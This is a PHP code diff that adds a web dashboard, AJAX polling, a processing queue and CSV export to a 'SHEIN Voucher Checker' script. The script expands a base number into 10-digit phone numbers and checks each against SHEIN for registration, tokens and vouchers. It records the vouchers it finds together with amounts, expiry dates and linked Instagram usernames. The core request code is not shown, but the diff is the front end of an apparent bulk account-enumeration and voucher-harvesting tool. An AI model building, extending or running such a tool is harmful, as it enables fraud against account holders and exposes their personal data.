+        // Process one number
+        $processed = processOneNumber($access_token);
+        
+        // Get updated stats
+        $stats = [
+            'total' => file_exists('checked_numbers.json') ? count(json_decode(file_get_contents('checked_numbers.json'), true) ?: []) : 0,
+            'registered' => file_exists('registered_numbers.json') ? count(json_decode(file_get_contents('registered_numbers.json'), true) ?: []) : 0,
+            'vouchers' => file_exists('voucher_numbers.json') ? count(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []) : 0,
+            'retries' => file_exists('retry_queue.json') ? count(json_decode(file_get_contents('retry_queue.json'), true) ?: []) : 0,
+            'not_registered' => 0
+        ];
+        $stats['not_registered'] = $stats['total'] - $stats['registered'];
+        
+        // Get recent logs
+        $sentLog = file_exists('sent_log.json') ? array_slice(json_decode(file_get_contents('sent_log.json'), true) ?: [], -15) : [];
+        $receivedLog = file_exists('received_log.json') ? array_slice(json_decode(file_get_contents('received_log.json'), true) ?: [], -15) : [];
+        $vouchers = file_exists('voucher_numbers.json') ? array_slice(array_reverse(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []), 0, 5) : [];
+        
+        echo json_encode([
+            'success' => true,
+            'processed' => $processed,
+            'stats' => $stats,
+            'sent_log' => $sentLog,
+            'received_log' => $receivedLog,
+            'vouchers' => $vouchers
+        ]);
+        exit;
+    }
     
-    // Check if form was submitted
-    $baseNumber = '';
+    // Handle start command
     if (isset($_POST['base_number']) && !empty($_POST['base_number'])) {
         $baseNumber = preg_replace('/[^0-9]/', '', $_POST['base_number']);
-        
-        // Store in session for the checker to use
+        addToQueue($baseNumber);
         session_start();
         $_SESSION['base_number'] = $baseNumber;
         $_SESSION['checker_running'] = true;
-        
-        // Redirect to avoid form resubmission
         header('Location: ' . $_SERVER['PHP_SELF'] . '?running=1');
         exit;
     }
     
-    // Check if we should show the running interface
-    session_start();
-    $isRunning = isset($_SESSION['checker_running']) && $_SESSION['checker_running'] === true;
-    $storedBaseNumber = $_SESSION['base_number'] ?? '';
-    
-    // If user wants to stop
+    // Handle stop command
     if (isset($_GET['stop'])) {
+        session_start();
         $_SESSION['checker_running'] = false;
-        $isRunning = false;
+        $queueFile = 'processing_queue.json';
+        if (file_exists($queueFile)) {
+            $queue = json_decode(file_get_contents($queueFile), true) ?: [];
+            foreach ($queue as $base => $data) {
+                $queue[$base]['status'] = 'stopped';
+            }
+            file_put_contents($queueFile, json_encode($queue, JSON_PRETTY_PRINT));
+        }
         header('Location: ' . $_SERVER['PHP_SELF']);
         exit;
     }
     
-    // HTML Interface
+    // Handle CSV export
+    if (isset($_GET['export']) && $_GET['export'] == 'csv') {
+        $csvFile = exportToCSV();
+        if ($csvFile && file_exists($csvFile)) {
+            header('Content-Type: text/csv');
+            header('Content-Disposition: attachment; filename="' . basename($csvFile) . '"');
+            readfile($csvFile);
+            exit;
+        }
+    }
+    
+    session_start();
+    $isRunning = isset($_SESSION['checker_running']) && $_SESSION['checker_running'] === true;
+    $storedBaseNumber = $_SESSION['base_number'] ?? '';
+    
+    // Load initial stats
+    $stats = [
+        'total' => file_exists('checked_numbers.json') ? count(json_decode(file_get_contents('checked_numbers.json'), true) ?: []) : 0,
+        'registered' => file_exists('registered_numbers.json') ? count(json_decode(file_get_contents('registered_numbers.json'), true) ?: []) : 0,
+        'vouchers' => file_exists('voucher_numbers.json') ? count(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []) : 0,
+        'retries' => file_exists('retry_queue.json') ? count(json_decode(file_get_contents('retry_queue.json'), true) ?: []) : 0,
+        'not_registered' => 0
+    ];
+    $stats['not_registered'] = $stats['total'] - $stats['registered'];
+    
+    $sentLog = file_exists('sent_log.json') ? array_slice(json_decode(file_get_contents('sent_log.json'), true) ?: [], -15) : [];
+    $receivedLog = file_exists('received_log.json') ? array_slice(json_decode(file_get_contents('received_log.json'), true) ?: [], -15) : [];
+    $vouchers = file_exists('voucher_numbers.json') ? array_slice(array_reverse(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []), 0, 5) : [];
     ?>
     <!DOCTYPE html>
     <html lang="en">
@@ -944,12 +721,7 @@ if ($isWeb) {
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>SHEIN Voucher Checker</title>
         <style>
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-            
+            * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
                 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -957,12 +729,7 @@ if ($isWeb) {
                 padding: 20px;
                 color: #333;
             }
-            
-            .container {
-                max-width: 1400px;
-                margin: 0 auto;
-            }
-            
+            .container { max-width: 1400px; margin: 0 auto; }
             .header {
                 background: white;
                 border-radius: 15px 15px 0 0;
@@ -970,17 +737,8 @@ if ($isWeb) {
                 box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                 margin-bottom: 20px;
             }
-            
-            .header h1 {
-                font-size: 28px;
-                margin-bottom: 10px;
-                color: #4a5568;
-            }
-            
-            .header p {
-                color: #718096;
-                font-size: 16px;
-            }
+            .header h1 { font-size: 28px; margin-bottom: 10px; color: #4a5568; }
+            .header p { color: #718096; font-size: 16px; }
             
             .stats-grid {
                 display: grid;
@@ -988,7 +746,6 @@ if ($isWeb) {
                 gap: 20px;
                 margin-bottom: 20px;
             }
-            
             .stat-card {
                 background: white;
                 padding: 20px;
@@ -996,11 +753,7 @@ if ($isWeb) {
                 box-shadow: 0 4px 15px rgba(0,0,0,0.05);
                 transition: transform 0.3s;
             }
-            
-            .stat-card:hover {
-                transform: translateY(-5px);
-            }
-            
+            .stat-card:hover { transform: translateY(-5px); }
             .stat-card .label {
                 font-size: 14px;
                 color: #718096;
@@ -1008,19 +761,16 @@ if ($isWeb) {
                 text-transform: uppercase;
                 letter-spacing: 1px;
             }
-            
             .stat-card .value {
                 font-size: 32px;
                 font-weight: bold;
                 color: #4a5568;
             }
-            
             .stat-card.total { border-left: 4px solid #4299e1; }
             .stat-card.not-registered { border-left: 4px solid #f56565; }
             .stat-card.registered { border-left: 4px solid #9f7aea; }
             .stat-card.vouchers { border-left: 4px solid #48bb78; }
             .stat-card.retries { border-left: 4px solid #ecc94b; }
-            .stat-card.errors { border-left: 4px solid #fc8181; }
             
             .control-panel {
                 background: white;
@@ -1029,13 +779,11 @@ if ($isWeb) {
                 margin-bottom: 20px;
                 box-shadow: 0 4px 15px rgba(0,0,0,0.05);
             }
-            
             .input-group {
                 display: flex;
                 gap: 15px;
                 flex-wrap: wrap;
             }
-            
             .input-group input {
                 flex: 1;
                 min-width: 250px;
@@ -1045,12 +793,10 @@ if ($isWeb) {
                 font-size: 16px;
                 transition: border-color 0.3s;
             }
-            
             .input-group input:focus {
                 outline: none;
                 border-color: #667eea;
             }
-            
             .btn {
                 padding: 12px 30px;
                 border: none;
@@ -1062,32 +808,26 @@ if ($isWeb) {
                 text-decoration: none;
                 display: inline-block;
             }
-            
             .btn-primary {
                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                 color: white;
             }
-            
             .btn-primary:hover {
                 transform: translateY(-2px);
                 box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
             }
-            
             .btn-danger {
                 background: #f56565;
                 color: white;
             }
-            
             .btn-danger:hover {
                 background: #e53e3e;
                 transform: translateY(-2px);
             }
-            
             .btn-success {
                 background: #48bb78;
                 color: white;
             }
-            
             .btn-success:hover {
                 background: #38a169;
                 transform: translateY(-2px);
@@ -1099,35 +839,26 @@ if ($isWeb) {
                 gap: 20px;
                 margin-bottom: 20px;
             }
-            
             .table-wrapper {
                 background: white;
                 border-radius: 12px;
                 overflow: hidden;
                 box-shadow: 0 4px 15px rgba(0,0,0,0.05);
             }
-            
             .table-header {
                 background: #f7fafc;
                 padding: 15px 20px;
                 border-bottom: 2px solid #e2e8f0;
             }
-            
-            .table-header h3 {
-                color: #4a5568;
-                font-size: 18px;
-            }
-            
+            .table-header h3 { color: #4a5568; font-size: 18px; }
             .table-scroll {
                 max-height: 400px;
                 overflow-y: auto;
             }
-            
             table {
                 width: 100%;
                 border-collapse: collapse;
             }
-            
             th {
                 background: #edf2f7;
                 padding: 12px;
@@ -1139,13 +870,11 @@ if ($isWeb) {
                 top: 0;
                 z-index: 10;
             }
-            
             td {
                 padding: 12px;
                 border-bottom: 1px solid #e2e8f0;
                 font-size: 14px;
             }
-            
             .status-success { color: #48bb78; font-weight: 600; }
             .status-error { color: #f56565; font-weight: 600; }
             .status-warning { color: #ecc94b; font-weight: 600; }
@@ -1158,18 +887,13 @@ if ($isWeb) {
                 margin-bottom: 20px;
                 box-shadow: 0 4px 15px rgba(0,0,0,0.05);
             }
-            
             .voucher-item {
                 display: flex;
                 align-items: center;
                 padding: 15px;
                 border-bottom: 1px solid #e2e8f0;
             }
-            
-            .voucher-item:last-child {
-                border-bottom: none;
-            }
-            
+            .voucher-item:last-child { border-bottom: none; }
             .voucher-badge {
                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                 color: white;
@@ -1179,22 +903,13 @@ if ($isWeb) {
                 font-weight: 600;
                 margin-right: 15px;
             }
-            
-            .voucher-details {
-                flex: 1;
-            }
-            
-            .voucher-details strong {
-                color: #4a5568;
-                font-size: 16px;
-            }
-            
+            .voucher-details { flex: 1; }
+            .voucher-details strong { color: #4a5568; font-size: 16px; }
             .voucher-details .meta {
                 color: #718096;
                 font-size: 13px;
                 margin-top: 4px;
             }
-            
             .voucher-code {
                 background: #edf2f7;
                 padding: 5px 10px;
@@ -1209,31 +924,40 @@ if ($isWeb) {
                 border-radius: 8px;
                 margin-bottom: 20px;
             }
-            
             .alert-info {
                 background: #ebf8ff;
                 border-left: 4px solid #4299e1;
                 color: #2b6cb0;
             }
             
-            .alert-warning {
-                background: #feebc8;
-                border-left: 4px solid #ed8936;
-                color: #c05621;
+            .status-text {
+                display: inline-block;
+                padding: 2px 8px;
+                border-radius: 4px;
+                font-size: 12px;
+                font-weight: 600;
             }
+            .status-text.success { background: #c6f6d5; color: #22543d; }
+            .status-text.error { background: #fed7d7; color: #742a2a; }
+            .status-text.warning { background: #feebc8; color: #744210; }
+            .status-text.info { background: #bee3f8; color: #1e4a6b; }
+            
+            .loading {
+                display: inline-block;
+                width: 20px;
+                height: 20px;
+                border: 3px solid #f3f3f3;
+                border-top: 3px solid #667eea;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+                margin-right: 10px;
+            }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
             
             @media (max-width: 768px) {
-                .tables-container {
-                    grid-template-columns: 1fr;
-                }
-                
-                .input-group {
-                    flex-direction: column;
-                }
-                
-                .btn {
-                    width: 100%;
-                }
+                .tables-container { grid-template-columns: 1fr; }
+                .input-group { flex-direction: column; }
+                .btn { width: 100%; }
             }
         </style>
     </head>
@@ -1245,94 +969,53 @@ if ($isWeb) {
             </div>
             
             <?php if ($isRunning): ?>
-            <div class="alert alert-info">
-                <strong>⚠️ Checker is currently running</strong> for base number: <?php echo htmlspecialchars($storedBaseNumber); ?>
-                <br>
-                <small>Results are being saved to files. This page auto-refreshes every 5 seconds.</small>
-                <div style="margin-top: 10px;">
+            <div class="alert alert-info" id="runningAlert">
+                <div style="display: flex; align-items: center;">
+                    <span class="loading"></span>
+                    <strong>Checker is running</strong> for base number: <?php echo htmlspecialchars($storedBaseNumber); ?>
+                    <span style="margin-left: 10px;">Processing numbers...</span>
+                </div>
+                <div style="margin-top: 15px;">
                     <a href="?stop=1" class="btn btn-danger" style="font-size: 14px; padding: 8px 20px;">🛑 Stop Checker</a>
                     <a href="?export=csv" class="btn btn-success" style="font-size: 14px; padding: 8px 20px; margin-left: 10px;">📥 Export CSV</a>
                 </div>
             </div>
             <?php endif; ?>
             
-            <div class="stats-grid">
-                <?php
-                // Load stats from files
-                $stats = [
-                    'total' => 0,
-                    'not_registered' => 0,
-                    'registered' => 0,
-                    'vouchers' => 0,
-                    'retries' => 0,
-                    'errors' => 0
-                ];
-                
-                if (file_exists('checked_numbers.json')) {
-                    $checked = json_decode(file_get_contents('checked_numbers.json'), true) ?: [];
-                    $stats['total'] = count($checked);
-                }
-                
-                if (file_exists('registered_numbers.json')) {
-                    $registered = json_decode(file_get_contents('registered_numbers.json'), true) ?: [];
-                    $stats['registered'] = count($registered);
-                }
-                
-                if (file_exists('voucher_numbers.json')) {
-                    $vouchers = json_decode(file_get_contents('voucher_numbers.json'), true) ?: [];
-                    $stats['vouchers'] = count($vouchers);
-                }
-                
-                if (file_exists('retry_queue.json')) {
-                    $retryQueue = json_decode(file_get_contents('retry_queue.json'), true) ?: [];
-                    $stats['retries'] = count($retryQueue);
-                }
-                
-                $stats['not_registered'] = $stats['total'] - $stats['registered'];
-                ?>
-                
+            <div class="stats-grid" id="statsGrid">
                 <div class="stat-card total">
                     <div class="label">Total Processed</div>
-                    <div class="value"><?php echo number_format($stats['total']); ?></div>
+                    <div class="value" id="stat-total"><?php echo number_format($stats['total']); ?></div>
                 </div>
-                
                 <div class="stat-card not-registered">
                     <div class="label">Not Registered</div>
-                    <div class="value"><?php echo number_format($stats['not_registered']); ?></div>
+                    <div class="value" id="stat-not-registered"><?php echo number_format($stats['not_registered']); ?></div>
                 </div>
-                
                 <div class="stat-card registered">
                     <div class="label">Registered</div>
-                    <div class="value"><?php echo number_format($stats['registered']); ?></div>
+                    <div class="value" id="stat-registered"><?php echo number_format($stats['registered']); ?></div>
                 </div>
-                
                 <div class="stat-card vouchers">
                     <div class="label">Vouchers Found</div>
-                    <div class="value"><?php echo number_format($stats['vouchers']); ?></div>
+                    <div class="value" id="stat-vouchers"><?php echo number_format($stats['vouchers']); ?></div>
                 </div>
-                
                 <div class="stat-card retries">
                     <div class="label">Pending Retries</div>
-                    <div class="value"><?php echo number_format($stats['retries']); ?></div>
-                </div>
-                
-                <div class="stat-card errors">
-                    <div class="label">Failed</div>
-                    <div class="value">0</div>
+                    <div class="value" id="stat-retries"><?php echo number_format($stats['retries']); ?></div>
                 </div>
             </div>
             
             <div class="control-panel">
                 <?php if (!$isRunning): ?>
-                <form method="POST" class="input-group">
+                <form method="POST" class="input-group" id="startForm">
                     <input type="text" name="base_number" placeholder="Enter base number (e.g., 98, 987, 98765)" required 
                            value="<?php echo htmlspecialchars($storedBaseNumber); ?>">
-                    <button type="submit" class="btn btn-primary">▶ Start Checker</button>
+                    <button type="submit" class="btn btn-primary" id="startBtn">▶ Start Checker</button>
                 </form>
                 <?php else: ?>
                 <div class="input-group">
                     <input type="text" value="Checker running for: <?php echo htmlspecialchars($storedBaseNumber); ?>" disabled>
-                    <a href="?stop=1" class="btn btn-danger">🛑 Stop Checker</a>
+                    <a href="?stop=1" class="btn btn-danger" id="stopBtn">🛑 Stop Checker</a>
                 </div>
                 <?php endif; ?>
                 
@@ -1348,39 +1031,23 @@ if ($isWeb) {
                         <h3>📤 Sent Requests (Last 15)</h3>
                     </div>
                     <div class="table-scroll">
-                        <table>
+                        <table id="sentTable">
                             <thead>
-                                <tr>
-                                    <th>Time</th>
-                                    <th>Number</th>
-                                    <th>Step</th>
-                                    <th>IP</th>
-                                    <th>Data</th>
-                                </tr>
+                                <tr><th>Time</th><th>Number</th><th>Step</th><th>IP</th><th>Data</th></tr>
                             </thead>
                             <tbody>
-                                <?php
-                                if (file_exists('sent_log.json')) {
-                                    $sentLog = json_decode(file_get_contents('sent_log.json'), true) ?: [];
-                                    $sentLog = array_slice(array_reverse($sentLog), 0, 15);
-                                    
-                                    foreach ($sentLog as $entry):
-                                ?>
+                                <?php foreach ($sentLog as $entry): ?>
                                 <tr>
                                     <td><?php echo htmlspecialchars($entry['time'] ?? ''); ?></td>
                                     <td><strong><?php echo htmlspecialchars($entry['number'] ?? ''); ?></strong></td>
-                                    <td>
-                                        <span class="status-info"><?php echo htmlspecialchars($entry['step'] ?? ''); ?></span>
-                                    </td>
+                                    <td><span class="status-text info"><?php echo htmlspecialchars($entry['step'] ?? ''); ?></span></td>
                                     <td><?php echo htmlspecialchars($entry['ip'] ?? ''); ?></td>
                                     <td><?php echo htmlspecialchars($entry['data'] ?? ''); ?></td>
                                 </tr>
-                                <?php
-                                    endforeach;
-                                } else {
-                                    echo '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
-                                }
-                                ?>
+                                <?php endforeach; ?>
+                                <?php if (empty($sentLog)): ?>
+                                <tr><td colspan="5" style="text-align: center;">No data yet</td></tr>
+                                <?php endif; ?>
                             </tbody>
                         </table>
                     </div>
@@ -1392,52 +1059,37 @@ if ($isWeb) {
                         <h3>📥 Received Responses (Last 15)</h3>
                     </div>
                     <div class="table-scroll">
-                        <table>
+                        <table id="receivedTable">
                             <thead>
-                                <tr>
-                                    <th>Time</th>
-                                    <th>Number</th>
-                                    <th>Status</th>
-                                    <th>Voucher</th>
-                                    <th>Amount</th>
-                                </tr>
+                                <tr><th>Time</th><th>Number</th><th>Status</th><th>Voucher</th><th>Amount</th></tr>
                             </thead>
                             <tbody>
-                                <?php
-                                if (file_exists('received_log.json')) {
-                                    $receivedLog = json_decode(file_get_contents('received_log.json'), true) ?: [];
-                                    $receivedLog = array_slice(array_reverse($receivedLog), 0, 15);
+                                <?php foreach ($receivedLog as $entry): 
+                                    $statusClass = '';
+                                    if ($entry['status'] == 'success') $statusClass = 'success';
+                                    elseif ($entry['status'] == 'not_registered') $statusClass = 'error';
+                                    elseif ($entry['status'] == 'retry') $statusClass = 'warning';
+                                    else $statusClass = 'info';
                                     
-                                    foreach ($receivedLog as $entry):
-                                        $statusClass = '';
-                                        if ($entry['status'] == 'success') $statusClass = 'status-success';
-                                        elseif ($entry['status'] == 'not_registered') $statusClass = 'status-error';
-                                        elseif ($entry['status'] == 'retry') $statusClass = 'status-warning';
-                                        else $statusClass = 'status-info';
+                                    $statusText = '';
+                                    if ($entry['status'] == 'success') $statusText = '✅ VOUCHER FOUND';
+                                    elseif ($entry['status'] == 'not_registered') $statusText = '❌ NOT REGISTERED';
+                                    elseif ($entry['status'] == 'registered') $statusText = '📱 REGISTERED';
+                                    elseif ($entry['status'] == 'token_obtained') $statusText = '🔑 TOKEN OK';
+                                    elseif ($entry['status'] == 'retry') $statusText = '🔄 RETRY (' . ($entry['retryCount'] ?? 1) . '/' . MAX_RETRIES . ')';
+                                    else $statusText = '⚠ ' . strtoupper($entry['status'] ?? '');
                                 ?>
                                 <tr>
                                     <td><?php echo htmlspecialchars($entry['time'] ?? ''); ?></td>
                                     <td><strong><?php echo htmlspecialchars($entry['number'] ?? ''); ?></strong></td>
-                                    <td class="<?php echo $statusClass; ?>">
-                                        <?php 
-                                        $status = $entry['status'] ?? '';
-                                        if ($status == 'success') echo '✅ VOUCHER FOUND';
-                                        elseif ($status == 'not_registered') echo '❌ NOT REGISTERED';
-                                        elseif ($status == 'registered') echo '📱 REGISTERED';
-                                        elseif ($status == 'token_obtained') echo '🔑 TOKEN OK';
-                                        elseif ($status == 'retry') echo '🔄 RETRY (' . ($entry['retryCount'] ?? 1) . '/' . MAX_RETRIES . ')';
-                                        else echo '⚠ ' . strtoupper($status);
-                                        ?>
-                                    </td>
+                                    <td><span class="status-text <?php echo $statusClass; ?>"><?php echo $statusText; ?></span></td>
                                     <td><?php echo htmlspecialchars($entry['voucher'] ?? '-'); ?></td>
-                                    <td><?php echo $entry['amount'] ? '₹' . htmlspecialchars($entry['amount']) : '-'; ?></td>
+                                    <td><?php echo isset($entry['amount']) ? '₹' . htmlspecialchars($entry['amount']) : '-'; ?></td>
                                 </tr>
-                                <?php
-                                    endforeach;
-                                } else {
-                                    echo '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
-                                }
-                                ?>
+                                <?php endforeach; ?>
+                                <?php if (empty($receivedLog)): ?>
+                                <tr><td colspan="5" style="text-align: center;">No data yet</td></tr>
+                                <?php endif; ?>
                             </tbody>
                         </table>
                     </div>
@@ -1445,38 +1097,30 @@ if ($isWeb) {
             </div>
             
             <!-- Recent Vouchers -->
-            <div class="vouchers-section">
+            <div class="vouchers-section" id="vouchersSection">
                 <h3 style="margin-bottom: 15px; color: #4a5568;">🎟 Recent Vouchers Found</h3>
-                
-                <?php
-                if (file_exists('voucher_numbers.json')) {
-                    $vouchers = json_decode(file_get_contents('voucher_numbers.json'), true) ?: [];
-                    $recentVouchers = array_slice(array_reverse($vouchers), 0, 5);
-                    
-                    if (!empty($recentVouchers)):
-                        foreach ($recentVouchers as $voucher):
-                ?>
-                <div class="voucher-item">
-                    <span class="voucher-badge">VOUCHER</span>
-                    <div class="voucher-details">
-                        <strong><?php echo htmlspecialchars($voucher['number']); ?></strong>
-                        <div class="meta">
-                            Instagram: @<?php echo htmlspecialchars($voucher['username'] ?? 'N/A'); ?> | 
-                            Expires: <?php echo htmlspecialchars($voucher['expiry'] ?? 'N/A'); ?>
+                <div id="vouchersList">
+                    <?php if (!empty($vouchers)): ?>
+                        <?php foreach ($vouchers as $voucher): ?>
+                        <div class="voucher-item">
+                            <span class="voucher-badge">VOUCHER</span>
+                            <div class="voucher-details">
+                                <strong><?php echo htmlspecialchars($voucher['number']); ?></strong>
+                                <div class="meta">
+                                    Instagram: @<?php echo htmlspecialchars($voucher['username'] ?? 'N/A'); ?> | 
+                                    Expires: <?php echo htmlspecialchars($voucher['expiry'] ?? 'N/A'); ?>
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <span class="voucher-code"><?php echo htmlspecialchars($voucher['voucher'] ?? 'N/A'); ?></span>
+                                <div style="font-weight: bold; color: #48bb78; margin-top: 5px;">₹<?php echo htmlspecialchars($voucher['amount'] ?? '0'); ?></div>
+                            </div>
                         </div>
-                    </div>
-                    <div style="text-align: right;">
-                        <span class="voucher-code"><?php echo htmlspecialchars($voucher['voucher'] ?? 'N/A'); ?></span>
-                        <div style="font-weight: bold; color: #48bb78; margin-top: 5px;">₹<?php echo htmlspecialchars($voucher['amount'] ?? '0'); ?></div>
-                    </div>
+                        <?php endforeach; ?>
+                    <?php else: ?>
+                        <p style="color: #718096; text-align: center;">No vouchers found yet</p>
+                    <?php endif; ?>
                 </div>
-                <?php
-                        endforeach;
-                    else:
-                        echo '<p style="color: #718096; text-align: center;">No vouchers found yet</p>';
-                    endif;
-                }
-                ?>
             </div>
             
             <!-- Log Files -->
@@ -1500,25 +1144,148 @@ if ($isWeb) {
         </div>
         
         <?php if ($isRunning): ?>
-        <!-- Auto-refresh every 5 seconds when checker is running -->
         <script>
-            setTimeout(function() {
-                window.location.reload();
-            }, 5000);
+            // Auto-update every 2 seconds when checker is running
+            let updateInterval = setInterval(updateData, 2000);
+            
+            function updateData() {
+                fetch('?ajax=process')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.error) {
+                            console.error('Error:', data.error);
+                            return;
+                        }
+                        
+                        // Update stats
+                        document.getElementById('stat-total').textContent = data.stats.total.toLocaleString();
+                        document.getElementById('stat-not-registered').textContent = data.stats.not_registered.toLocaleString();
+                        document.getElementById('stat-registered').textContent = data.stats.registered.toLocaleString();
+                        document.getElementById('stat-vouchers').textContent = data.stats.vouchers.toLocaleString();
+                        document.getElementById('stat-retries').textContent = data.stats.retries.toLocaleString();
+                        
+                        // Update sent table
+                        updateSentTable(data.sent_log);
+                        
+                        // Update received table
+                        updateReceivedTable(data.received_log);
+                        
+                        // Update vouchers
+                        updateVouchers(data.vouchers);
+                    })
+                    .catch(error => console.error('Fetch error:', error));
+            }
+            
+            function updateSentTable(sentLog) {
+                const tbody = document.querySelector('#sentTable tbody');
+                if (!tbody) return;
+                
+                let html = '';
+                if (sentLog && sentLog.length > 0) {
+                    sentLog.forEach(entry => {
+                        html += `<tr>
+                            <td>${escapeHtml(entry.time || '')}</td>
+                            <td><strong>${escapeHtml(entry.number || '')}</strong></td>
+                            <td><span class="status-text info">${escapeHtml(entry.step || '')}</span></td>
+                            <td>${escapeHtml(entry.ip || '')}</td>
+                            <td>${escapeHtml(entry.data || '')}</td>
+                        </tr>`;
+                    });
+                } else {
+                    html = '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
+                }
+                tbody.innerHTML = html;
+            }
+            
+            function updateReceivedTable(receivedLog) {
+                const tbody = document.querySelector('#receivedTable tbody');
+                if (!tbody) return;
+                
+                let html = '';
+                if (receivedLog && receivedLog.length > 0) {
+                    receivedLog.forEach(entry => {
+                        let statusClass = '';
+                        let statusText = '';
+                        
+                        if (entry.status == 'success') {
+                            statusClass = 'success';
+                            statusText = '✅ VOUCHER FOUND';
+                        } else if (entry.status == 'not_registered') {
+                            statusClass = 'error';
+                            statusText = '❌ NOT REGISTERED';
+                        } else if (entry.status == 'registered') {
+                            statusClass = 'info';
+                            statusText = '📱 REGISTERED';
+                        } else if (entry.status == 'token_obtained') {
+                            statusClass = 'info';
+                            statusText = '🔑 TOKEN OK';
+                        } else if (entry.status == 'retry') {
+                            statusClass = 'warning';
+                            statusText = `🔄 RETRY (${entry.retryCount || 1}/${MAX_RETRIES})`;
+                        } else {
+                            statusClass = 'info';
+                            statusText = '⚠ ' + (entry.status || '').toUpperCase();
+                        }
+                        
+                        html += `<tr>
+                            <td>${escapeHtml(entry.time || '')}</td>
+                            <td><strong>${escapeHtml(entry.number || '')}</strong></td>
+                            <td><span class="status-text ${statusClass}">${statusText}</span></td>
+                            <td>${escapeHtml(entry.voucher || '-')}</td>
+                            <td>${entry.amount ? '₹' + escapeHtml(entry.amount) : '-'}</td>
+                        </tr>`;
+                    });
+                } else {
+                    html = '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
+                }
+                tbody.innerHTML = html;
+            }
+            
+            function updateVouchers(vouchers) {
+                const vouchersList = document.getElementById('vouchersList');
+                if (!vouchersList) return;
+                
+                if (vouchers && vouchers.length > 0) {
+                    let html = '';
+                    vouchers.forEach(voucher => {
+                        html += `<div class="voucher-item">
+                            <span class="voucher-badge">VOUCHER</span>
+                            <div class="voucher-details">
+                                <strong>${escapeHtml(voucher.number)}</strong>
+                                <div class="meta">
+                                    Instagram: @${escapeHtml(voucher.username || 'N/A')} | 
+                                    Expires: ${escapeHtml(voucher.expiry || 'N/A')}
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <span class="voucher-code">${escapeHtml(voucher.voucher || 'N/A')}</span>
+                                <div style="font-weight: bold; color: #48bb78; margin-top: 5px;">₹${escapeHtml(voucher.amount || '0')}</div>
+                            </div>
+                        </div>`;
+                    });
+                    vouchersList.innerHTML = html;
+                }
+            }
+            
+            function escapeHtml(unsafe) {
+                if (!unsafe) return '';
+                return unsafe
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+            }
+            
+            // Handle page unload - stop checking when user leaves
+            window.addEventListener('beforeunload', function() {
+                clearInterval(updateInterval);
+            });
         </script>
         <?php endif; ?>
     </body>
     </html>
     <?php
-    
-    // If checker is running, we need to actually run the checker
-    if ($isRunning && $storedBaseNumber) {
-        // This would be where your main checker loop runs
-        // For now, we'll just log that it's running
-        // You'll need to adapt your main processing loop to work in web mode
-        // This might require using background processes or queue systems
-    }
-    
     exit;
 }
 
@@ -1526,9 +1293,6 @@ if ($isWeb) {
 // CLI MODE - Original functionality preserved
 // ============================================================================
 if ($isCli) {
-    // Original CLI code continues here exactly as before
-    // ... (all your original CLI code remains unchanged)
-    
     loadCheckedNumbers();
     loadRetryQueue();
 
@@ -1537,13 +1301,11 @@ if ($isCli) {
     echo "║                    SHEIN VOUCHER CHECKER - RETRY ONLY REAL ERRORS                         ║\n";
     echo "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝\n" . COLOR_RESET . "\n";
 
-    // Display retry queue size on start
     if (!empty($retryQueue)) {
         echo COLOR_YELLOW . "⚠ Found " . count($retryQueue) . " pending retries from previous session (REAL ERRORS only)\n" . COLOR_RESET;
         echo COLOR_YELLOW . "⚠ These will be processed first\n\n" . COLOR_RESET;
     }
 
-    // Get user input (STDIN works fine in CLI)
     echo COLOR_BOLD . "Enter Base Number (any length, will be completed to 10 digits): " . COLOR_RESET;
     $input = trim(fgets(STDIN));
     $baseNumber = preg_replace('/[^0-9]/', '', $input);
